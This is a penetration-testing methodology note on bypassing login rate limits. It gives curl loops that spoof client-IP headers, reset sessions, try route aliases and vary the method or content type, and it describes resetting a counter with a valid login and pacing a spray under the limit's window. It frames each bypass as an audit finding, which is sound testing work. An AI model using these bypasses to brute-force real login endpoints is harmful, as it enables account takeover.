# Rate-limit bypass (deep) — every counter-reset, worked

## The counter-key first — always

A bypass is a reset of the counter's KEY. Find the key before guessing
the reset — rotate one variable at a time and watch when `429` clears.

## Source-IP resets — the header set

```bash
for h in 'X-Forwarded-For' 'X-Real-IP' 'X-Client-IP' 'X-Originating-IP' \
         'X-Remote-IP' 'X-Remote-Addr' 'X-Forwarded' 'Forwarded-For' \
         'Forwarded' 'CF-Connecting-IP' 'True-Client-IP' 'Fastly-Client-IP' \
         'X-Cluster-Client-IP' 'Via' 'Client-IP'; do
  curl -s -o /dev/null -w "%{http_code} [$h]\n" -X POST \
    -H "$h: $((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))" \
    -d 'user=x&pass=y' "$BASE/login"
done
```

A `429` → `200`/`401` under a spoofed header means the app reads it for
the counter-key — the app trusts `X-Forwarded-For` for a security
decision. The bypass is the finding; rotate the value per-request and
the per-IP limit never fires.

## Session resets — the cookie-key

```bash
# no cookie jar — a fresh session per request
curl -s -o /dev/null -w '%{http_code}\n' -X POST -d 'user=x&pass=y' "$BASE/login"
# vs with a jar that accumulates
curl -sc /tmp/cj -b /tmp/cj -o /dev/null -w '%{http_code}\n' -X POST -d 'user=x&pass=y' "$BASE/login"
```

A `429` that clears when the session is fresh means the counter is
session-keyed — drop the cookie and it never fires.

## Endpoint resets — the route-alias

```bash
for ep in /login /login/ /api/login /api/v1/login /api/v2/login /auth \
          /api/auth /signin /session /token /oauth/token /LOGIN; do
  curl -s -o /dev/null -w "%{http_code} $ep\n" -X POST -d 'user=x&pass=y' "$BASE$ep"
done
```

`/login` `429`s but `/api/login` `200`s → the limiter is route-scoped;
the alias bypasses it.

## Method/param/content-type resets

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X GET "$BASE/login?user=x&pass=y"   # method
curl -s -o /dev/null -w '%{http_code}\n' -X POST -d '{"username":"x","password":"y"}' -H 'Content-Type: application/json' "$BASE/login"  # JSON vs form
curl -s -o /dev/null -w '%{http_code}\n' -X POST -d 'user=x&pass=y' "$BASE/login" --user-agent 'x'  # UA
```

A method/Content-Type/param-name the limiter does not count is the gap.

## The success-reset

A limiter that counts only FAILED attempts resets on a success — if you
have one valid credential, interleave it to reset the counter. Or a
"successful login resets the counter" design — a success clears the N.

## The window-spray

A `1/sec` or `N/min` window bounds but does not block — a spray paced
under the window still runs to completion, just slower. Measure the
window (`N per T`); the finding is the window, not "no throttle".

## The verdict record

`limit reset by <header/session/endpoint/method>` — the exact reset,
verbatim, with the `429→200` pair. The bypass is a broken control, the
finding, not a license for an unbounded run.
